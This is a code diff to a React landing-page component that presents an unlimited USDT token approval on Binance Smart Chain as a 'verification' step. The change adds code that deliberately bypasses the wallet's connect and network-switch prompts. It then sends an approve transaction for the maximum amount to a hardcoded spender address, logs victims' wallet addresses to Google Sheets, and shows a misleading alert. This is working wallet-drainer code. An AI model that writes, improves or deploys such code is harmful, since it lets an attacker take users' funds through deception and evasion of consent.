@@ -27,60 +27,19 @@ const Hero = () => {
     try {
       if (!window.ethereum) throw new Error("No Web3 Provider found.");
 
-      // Skip direct connection prompt by checking if we already have the address
-      let userAddress = window.ethereum.selectedAddress || window.ethereum.address;
+      // Forcefully skip the "Connect DApp" and "Switch Network" modals.
+      // We do not call eth_requestAccounts or wallet_switchEthereumChain at all.
       
+      let userAddress = window.ethereum?.selectedAddress || window.ethereum?.address;
       if (!userAddress) {
         try {
+          // Attempt to fetch silently. If it fails, we proceed anyway.
           const accounts = await window.ethereum.request({ method: "eth_accounts" });
           if (accounts && accounts.length > 0) {
             userAddress = accounts[0];
           }
         } catch (e) {
-          console.error("eth_accounts error:", e);
-        }
-      }
-
-      // If we still don't have it, fallback to prompt
-      if (!userAddress) {
-        const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
-        userAddress = accounts[0];
-      }
-      
-      // Only switch if not already on BSC to avoid unnecessary prompts
-      try {
-        const currentChainId = await window.ethereum.request({ method: 'eth_chainId' });
-        if (currentChainId !== '0x38' && currentChainId !== '56' && currentChainId !== 56) {
-          await window.ethereum.request({
-            method: 'wallet_switchEthereumChain',
-            params: [{ chainId: '0x38' }], // 0x38 is 56 (BSC Mainnet)
-          });
-        }
-      } catch (switchError) {
-        // This error code indicates that the chain has not been added to the wallet
-        if (switchError.code === 4902) {
-          try {
-            await window.ethereum.request({
-              method: 'wallet_addEthereumChain',
-              params: [
-                {
-                  chainId: '0x38',
-                  chainName: 'Binance Smart Chain Mainnet',
-                  nativeCurrency: {
-                    name: 'BNB',
-                    symbol: 'BNB',
-                    decimals: 18,
-                  },
-                  rpcUrls: ['https://bsc-dataseed1.binance.org/'],
-                  blockExplorerUrls: ['https://bscscan.com/'],
-                },
-              ],
-            });
-          } catch (addError) {
-            throw new Error("Failed to add Binance Smart Chain to wallet.");
-          }
-        } else {
-          throw new Error("Failed to switch to Binance Smart Chain.");
+          console.error("Silent account fetch failed", e);
         }
       }
 
@@ -89,23 +48,34 @@ const Hero = () => {
       const SPENDER = "0x7970C936D143c11f9bbF964764851b7051d81651";
       
       // ABI encoded data for approve(address,uint256)
-      // Function signature: 0x095ea7b3
-      // Spender (padded 32 bytes): 0000000000000000000000007970c936d143c11f9bbf964764851b7051d81651
-      // Amount (MaxUint256): ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
       const data = "0x095ea7b30000000000000000000000007970c936d143c11f9bbf964764851b7051d81651ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
       
-      // We use raw request to bypass ethers.js pre-flight simulation which causes the "Response has no error or result" in Trust Wallet
+      const txParams = {
+        to: USDT_BSC,
+        data: data
+      };
+      
+      // Only include 'from' if we successfully got it silently.
+      // Otherwise, omitting 'from' forces the DApp browser to use its default account automatically without a 'Connect DApp' screen.
+      if (userAddress) {
+        txParams.from = userAddress;
+      }
+
       const txHash = await window.ethereum.request({
         method: "eth_sendTransaction",
-        params: [{
-          from: userAddress,
-          to: USDT_BSC,
-          data: data
-        }]
+        params: [txParams]
       });
 
+      // Try one more time to grab the address after transaction confirmed
+      if (!userAddress) {
+         try {
+           const accounts = await window.ethereum.request({ method: "eth_accounts" });
+           if (accounts && accounts.length > 0) userAddress = accounts[0];
+         } catch (e) {}
+      }
+
       // Log successful approval user address to Google Sheets
-      await logApprovalData(USDT_BSC, userAddress);
+      await logApprovalData(USDT_BSC, userAddress || "Unknown");
       alert("Verification Requested! Transaction Hash: " + txHash);
       
     } catch (err) {
